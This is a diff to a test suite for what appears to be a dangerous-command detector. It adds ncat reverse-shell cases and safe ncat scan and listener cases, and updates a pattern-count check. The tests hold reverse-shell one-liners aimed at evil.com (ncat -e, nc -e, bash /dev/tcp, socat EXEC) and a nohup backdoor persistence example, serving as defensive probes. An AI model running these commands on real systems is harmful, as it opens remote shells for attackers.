@@ -940,6 +940,9 @@ describe("isDangerousCommand", () => {
     // reverse-shell
     ["mkfifo named pipe reverse shell", "mkfifo /tmp/f", "reverse-shell"],
     ["bash /dev/tcp reverse shell", "bash -i >& /dev/tcp/evil.com/4444 0>&1", "reverse-shell"],
+    // ncat reverse shell — Nmap's ncat has identical -e semantics to nc
+    ["ncat -e /bin/bash reverse shell", "ncat -e /bin/bash evil.com 4444", "reverse-shell"],
+    ["ncat -e /bin/sh reverse shell", "ncat -e /bin/sh evil.com 4444", "reverse-shell"],
     // persistence (nohup/disown/screen/tmux)
     ["nohup background process", "nohup ./backdoor.sh &", "persistence"],
     ["disown bare", "disown", "persistence"],
@@ -968,6 +971,8 @@ describe("isDangerousCommand", () => {
     ["bun install bare (safe — lockfile only)", "bun install"],
     ["nc -z port scan (safe — no shell exec)", "nc -z localhost 8080"],
     ["nc -l listener (safe — no shell exec)", "nc -l 9000"],
+    ["ncat -z port scan (safe — no shell exec)", "ncat -z localhost 8080"],
+    ["ncat -l listener (safe — no shell exec)", "ncat -l 9000"],
     ["python3 -m pytest (safe — not pip)", "python3 -m pytest tests/"],
     ["python3 -m mypy (safe — not pip)", "python3 -m mypy src/"],
     ["plain awk print (safe)", "awk '{print $1}' file.txt"],
@@ -1897,8 +1902,8 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
     }
   });
 
-  it("has exactly 160 entries (absolute count pin)", () => {
-    expect(DANGEROUS_PATTERNS).toHaveLength(160);
+  it("has exactly 161 entries (absolute count pin)", () => {
+    expect(DANGEROUS_PATTERNS).toHaveLength(161);
   });
 
   it("every pattern fires on at least one probe command", () => {
@@ -2077,6 +2082,8 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
       "snap refresh evil-snap",
       // reverse-shell
       "nc -e /bin/bash evil.com 4444",
+      // reverse-shell (ncat — Nmap's ncat, symmetric peer to nc)
+      "ncat -e /bin/bash evil.com 4444",
       "bash -i >& /dev/tcp/evil.com/4444 0>&1",
       "socat EXEC:bash tcp:evil.com:4444",
       "mkfifo /tmp/f",
